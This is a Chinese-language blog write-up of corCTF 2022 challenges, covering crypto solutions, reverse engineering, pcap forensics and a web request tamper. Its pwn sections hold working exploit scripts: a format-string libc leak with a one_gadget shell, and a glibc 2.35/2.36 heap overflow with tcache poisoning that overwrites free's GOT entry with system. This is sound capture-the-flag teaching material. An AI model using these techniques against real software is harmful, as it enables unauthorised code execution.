layout: post
title: corctf2022-wp
author: junyu33
mathjax: true
tags: 

- crypto
- reverse
- misc
- web
- pwn

categories:

  - ctf

date: 2022-8-11 22:00:00

---

把各个方向的简单题给摸完了。

当然这样是不行的。

<!-- more -->

## tadpole

题面：

```python
from Crypto.Util.number import bytes_to_long, isPrime
from secrets import randbelow

p = bytes_to_long(open("flag.txt", "rb").read())
assert isPrime(p)

a = randbelow(p)
b = randbelow(p)

def f(s):
    return (a * s + b) % p

print("a = ", a)
print("b = ", b)
print("f(31337) = ", f(31337))
print("f(f(31337)) = ", f(f(31337)))
```

下减上得：

$a*(f-s) \equiv ff - f \pmod p$

左右相减是p的倍数，分解质因数即可（其实就是质数）。

## luckyguess

```python
#!/usr/local/bin/python
from random import getrandbits

p = 2**521 - 1
a = getrandbits(521)
b = getrandbits(521)
print("a =", a)
print("b =", b)

try:
    x = int(input("enter your starting point: "))
    y = int(input("alright, what's your guess? "))
except:
    print("?")
    exit(-1)

r = getrandbits(20)
for _ in range(r):
    x = (x * a + b) % p

if x == y:
    print("wow, you are truly psychic! here, have a flag:", open("flag.txt").read())
else:
    print("sorry, you are not a true psychic... better luck next time")
```

使用不动点，构造 $x$使$x \equiv x*a+b \pmod p$

故$p-b \equiv x*(a-1) \pmod p$

$ x \equiv (a-1)^{-1} * (p-b) \pmod p$，直接`gmpy2.invert`即可。

## exchanged

```python
from Crypto.Util.number import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from hashlib import sha256
from secrets import randbelow

p = 142031099029600410074857132245225995042133907174773113428619183542435280521982827908693709967174895346639746117298434598064909317599742674575275028013832939859778024440938714958561951083471842387497181706195805000375824824688304388119038321175358608957437054475286727321806430701729130544065757189542110211847
a = randbelow(p)
b = randbelow(p)
s = randbelow(p)

print("p =", p)
print("a =", a)
print("b =", b)
print("s =", s)

a_priv = randbelow(p)
b_priv = randbelow(p)

def f(s):
    return (a * s + b) % p

def mult(s, n):
    for _ in range(n):
        s = f(s)
    return s

A = mult(s, a_priv)
B = mult(s, b_priv)

print("A =", A)
print("B =", B)

shared = mult(A, b_priv)
assert mult(B, a_priv) == shared

flag = open("flag.txt", "rb").read()
key = sha256(long_to_bytes(shared)).digest()[:16]
iv = long_to_bytes(randint(0, 2**128))
cipher = AES.new(key, AES.MODE_CBC, iv=iv)
print(iv.hex() + cipher.encrypt(pad(flag, 16)).hex())
```

（以下相等默认在模$p$的条件下）

将`mult`展开得：

$$A = a^x s+\sum_{i=0}^{x-1}a^ib$$

$$B = a^y s+\sum_{i=0}^{y-1}a^ib$$

推一下式子可得：

$$shared = a^yA+B-a^ys$$

将B错位相减得：

$$a^{y+1}s-a^y(b-s)-b=B(a-1)$$

$$a^y = (Aa-A+b)(b+as-s)^{-1}$$

故可求得$shared$.

注意aes CBC模式的key与iv都是大端序。

```python
from Crypto.Util.number import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from hashlib import sha256
from secrets import randbelow
from gmpy2 import *

p = ...
a = ...
b = ...
s = ...
A = ...
B = ...
iv = 0xe0364f9f55fc27fc46f3ab1dc9db48fa
enc = 0x482eae28750eaba12f4f76091b099b01fdb64212f66caa6f366934c3b9929bad37997b3f9d071ce3c74d3e36acb26d6efc9caa2508ed023828583a236400d64e
iv = iv.to_bytes(16, 'big')
enc = enc.to_bytes(64, 'big')

a_y = (B*(a-1)+b) * invert((b+a*s-s), p) % p
shared = (a_y*A+B+(p-a_y)*s) % p

key = sha256(long_to_bytes(shared)).digest()[:16]
cipher = AES.new(key, AES.MODE_CBC, iv=iv)
plain = cipher.decrypt(enc)
print(plain)
```

## Microsoft ❤️ Linux

前半部分直接ida加载32位elf格式，将指定范围的bytes `ror 13`即可。（其实就是`ror 5`）

后半部分ida用二进制模式打开，选择16位，可以发现是dos指令，加密方式是`xor 13`，长度为18，然而加密范围好像有点问题。

密文只可能存在于0x210~0x233之间，整个异或13之后发现后18位像flag，与前面拼接即可。

## whack-a-frog

拿到一个pcap文件，查看发现有很多get请求。

先提取这些get请求：

```sh
cat whacking-the-froggers.pcap| grep -a 'anticheat?x=' > in
```

其中都含有x坐标和y坐标。使用正则表达式提取：

```python
from pwn import *
import re
io = open('in', 'rb')
out = open('out', 'w')
x = []
y = []
for i in range(10000):
   get = io.readline()
   if len(re.findall(rb'x=\d+', get)) > 0:
      print(int(re.findall(rb'x=\d+', get)[0][2:]), 
            int(re.findall(rb'y=\d+', get)[0][2:]), file=out)
```

然后用c语言转换成字符画，结果之前把x和y搞反了：

```c
#include <stdio.h>
#include <stdlib.h>
int mp[600][600];
int main()
{
  freopen("out", "r", stdin);
  freopen("flag", "w", stdout);
  int x, y;
  for (int i = 0; i < 2204; i++)
  {
    scanf("%d %d", &x, &y);
    // mp[x][y] = 1;
    mp[y][x] = 1;
  }
  for (int i = 0; i < 600; i++) 
  {
    for (int j = 0; j < 600; j++)
      if (mp[i][j])
        printf("0");
      else
        printf(" ");
    printf("\n");
  }
  return 0;
}
```

gedit缩小查看，发现笔画大致是对的，那应该就是flag了。

## jsonquiz

最后提交分数的时候抓包把`score=0`改为`score=100`即可。

## babypwn

```bash
$ one_gadget /usr/lib/x86_64-linux-gnu/libc.so.6
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

```

内平栈，格式化字符串泄露libc。由于r12和r15都在栈上，最后把缓冲区换成全0的内存地址，`one_gadget`一把即可。

```python
def exploit():
   io.sendline('%7$p')
   io.recvuntil('Hi, ')
   libc_base = int(io.recv(14), 16) - 0x6bc0 - (0x9c000 - 0xa4000) # 0x6bc0 is from IDA func _$LT$str$u20$as$u20$core..fmt..Display$GT$::fmt::he0adfaca1b7317bf which is in main, and the latter offset is from debugging
   zero = libc_base + 8
   one_gadget = 0xe3afe
   payload = p64(zero)*12 + p64(libc_base+one_gadget)
   io.sendline(payload)
```



## cshell2（赛后补的）

libc 2.36的heap overflow+tcache poisoning，由于libc 2.36跟2.35的安全机制没啥区别，就用本地的2.35做了。

io是真的硬伤。

```python
# all io.sendline() or the stream will stuck

def decrypt_pointer(leak: int) -> int:
    parts = []

    parts.append((leak >> 36) << 36)
    parts.append((((leak >> 24) & 0xFFF) ^ (parts[0] >> 36)) << 24)
    parts.append((((leak >> 12) & 0xFFF) ^ ((parts[1] >> 24) & 0xFFF)) << 12)

    return parts[0] | parts[1] | parts[2]

def exploit():
   # leak libc
   add(0, 1032, '//bin/sh\0', '', '', 0, '')
   add(1, 1032, '', '', '', 0, '')

   for i in range(2, 11):
      add(i, 1032, '', '', '', 0, '')
   for i in range(2, 9):
      dele(i)

   dele(1) # unsortedbin
   edit(0, '', '', '', 0, b'a'*(1032-64+7)) # last byte is for '\n'
   show(0)

   libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['main_arena'] - 0x60
   # 0x1f2ce0 in glibc-2.35
   log.success('libc_base: ' + hex(libc_base))

   # leak heap
   add(11, 1032, '', '', '', 0, '') #8
   dele(9)
   edit(11, '', '', '', 0, b'b'*(1032-64)+b'abcdefg')
   show(11)
   io.recvuntil('abcdefg\n')
   heap_base = decrypt_pointer(u64(io.recvuntil(b'1 Add\n')[:-6].ljust(8, b'\x00'))) - 0x1000
   log.success('heap_base: ' + hex(heap_base))
   
   # getshell
   fake_chunk = b'c'*(1032-64)+p64(0x411)+p64(((heap_base+0x2730)>>12)^0x404010) # buf overflow, make the chunk aligned to 16 bytes
   edit(11, '', '', '', 0, fake_chunk)
   add(12, 1032, '', '', '', 0, '') # nothing

   io.sendline('1') # 0x2730 = 0x250 + 0x410*9 + 0x10 + 0x40
   io.sendline('13')
   io.sendline('1032')
   io.send('n1rvana') # since we make the chunk at 0x401010, it's null and we can fill anything
   io.send(p64(libc_base+libc.sym['system'])) # where the free.got is
   io.send(p64(libc_base+libc.sym['puts'])) # keeping the same
   io.sendline('0') 
   io.send(p64(libc_base+libc.sym['scanf'])) # keeping the same
   dele(0)
```

